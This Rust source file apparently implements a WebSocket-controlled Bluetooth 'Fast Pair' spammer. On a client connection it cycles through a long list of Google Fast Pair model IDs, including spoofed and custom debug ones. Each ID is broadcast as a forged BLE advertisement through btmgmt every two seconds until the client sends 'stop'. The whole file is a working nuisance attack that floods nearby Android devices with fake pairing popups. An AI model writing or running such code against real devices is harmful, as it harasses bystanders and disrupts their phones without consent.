use std::sync::mpsc::channel;
use std::sync::mpsc::TryRecvError;
use std::thread;
use std::{process::Command, time};
use axum::extract::connect_info::ConnectInfo;
use axum::{
    body::Bytes,
    extract::ws::{Message, WebSocket, WebSocketUpgrade},
    response::IntoResponse
};
use axum_extra::TypedHeader;

use futures::StreamExt;
use std::net::SocketAddr;

pub fn _fastpair_handler(
    ws: WebSocketUpgrade,
    user_agent: Option<TypedHeader<headers::UserAgent>>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
) -> impl IntoResponse {
    let user_agent = if let Some(TypedHeader(user_agent)) = user_agent {
        user_agent.to_string()
    } else {
        String::from("Unknown browser")
    };
    println!("`{user_agent}` at {addr} connected.");
    // finalize the upgrade process by returning upgrade callback.
    // we can customize the callback by sending additional info such as address.
    ws.on_upgrade(move |socket| send_fastpair_packet(socket, addr))
}

pub async fn send_fastpair_packet(mut socket: WebSocket, who: SocketAddr) {
    if socket
        .send(Message::Ping(Bytes::from_static(&[1, 2, 3])))
        .await
        .is_ok()
    {
        println!("Pinged {who}...");
    } else {
        println!("Could not send ping {who}!");
        return;
    }
    
    let devices = vec![
        "0001F0", "000047", "470000", "00000A", "0A0000", "00000B", "0B0000", "0C0000", "00000D",
        "000007", "070000", "000008", "080000", "000009", "090000", "000035", "350000", "000048",
        "480000", "000049", "490000", "001000", "00B727", "01E5CE", "0200F0", "00F7D4", "F00002",
        "F00400", "1E89A7", // Phone setup
        "00000C", "0577B1", "05A9BC", // Genuine devices
        "CD8256", "0000F0", "F00000", "821F66", "F52494", "718FA4", "0002F0", "92BBBD", "000006",
        "060000", "D446A7", "2D7A23", "0E30C3", "72EF8D", "72FB00", "0003F0", "002000", "003000",
        "003001", "00A168", "00AA48", "00AA91", "00C95C", "01EEB4", "02AA91", "01C95C", "02D815",
        "035764", "038CC7", "02DD4F", "02E2A9", "035754", "02C95C", "038B91", "02F637", "02D886",
        "F00000", "F00001", "F00201", "F00204", "F00209", "F00205", "F00200", "F00208", "F00207",
        "F00206", "F0020A", "F0020B", "F0020C", "F00203", "F00202", "F00213", "F0020F", "F0020E",
        "F00214", "F00212", "F0020D", "F00211", "F00215", "F00210", "F00305", "F00304", "F00308",
        "F00303", "F00306", "F00300", "F00309", "F00302", "F00307", "F00301", "F00E97", "04ACFC",
        "04AA91", "04AFB8", "05A963", "05AA91", "05C452", "05C95C", "0602F0", "0603F0", "1E8B18",
        "1E955B", "1EC95C", "1ED9F9", "1EE890", "1EEDF5", "1F1101", "1F181A", "1F2E13", "1F4589",
        "1F4627", "1F5865", "1FBB50", "1FC95C", "1FE765", "1FF8FA", "201C7C", "202B3D", "20330C",
        "003B41", "003D8B", "005BC3", "008F7D", "00FA72", "0100F0", "011242", "013D8B", "01AA91",
        "038F16", "039F8F", "03AA91", "03B716", "03C95C", "03C99C", "03F5D4", "045754", "045764",
        "04C95C", "050F0C", "052CC7", "057802", "0582FD", "058D08", "06AE20", "06C197", "06C95C",
        "06D8FC", "0744B6", "07A41C", "07C95C", "07F426", "0102F0", "0202F0", "0302F0", "0402F0",
        "0502F0", "0702F0", "0802F0", "054B2D", "0660D7", "0103F0", "0203F0", "0303F0", "0403F0",
        "0503F0", "0703F0", "0803F0", "0903F0", // Custom debug popups
        "D99CA1", "77FF67", "AA187F", "DCE9EA", "87B25F", "F38C02", "1448C9", "D5AB33", "0C0B67",
        "13B39D", "AA1FE1", "7C6CDB", "005EF9", "E2106F", "B37A62",
    ];

    let (tx, rx) = channel();

    let (mut _sender, mut receiver) = socket.split();

    let mut recv_task = tokio::spawn(async move {
        loop {
            let msg = receiver.next().await.expect("error").expect("error2");
            if msg.to_text().expect("Can't parse to str") == "stop" {
                println!("Stopping clint");
                // cancelled = true;
                break;
            }
        }
    });

    thread::spawn(move || {
        loop {
            let mut cancelled = false;
            for device in devices.clone() {
                println!("Advertising: {}", device);
                let mut bt_process = Command::new("btmgmt")
                    .arg("add-adv")
                    .arg("-c")
                    .arg("-d")
                    .arg(std::format!(
                        "020a0003032cfe06162cfe{}",
                        device
                    ))
                    .arg("1")
                    .spawn().unwrap();
                    thread::sleep(time::Duration::from_millis(2000));
                    bt_process.wait().expect("Can't wait");
                    match rx.try_recv() {
                        Ok(_) | Err(TryRecvError::Disconnected) => {
                            println!("Terminating.");
                            cancelled = true;
                            break;
                        }
                        Err(TryRecvError::Empty) => {}
                    }
            }
            if cancelled {
                println!("Killing loop");
                break;
            }
        }
    });

    // If any one of the tasks exit, abort the other.
    tokio::select! {
        rv_b = (&mut recv_task) => {
            match rv_b {
                Ok(_b) => println!("Rec killed"),
                Err(b) => println!("Error receiving messages {b:?}")
            }
            let _ = tx.send(());
        }
    }
    // send_task.
    println!("Destroying socket");
}
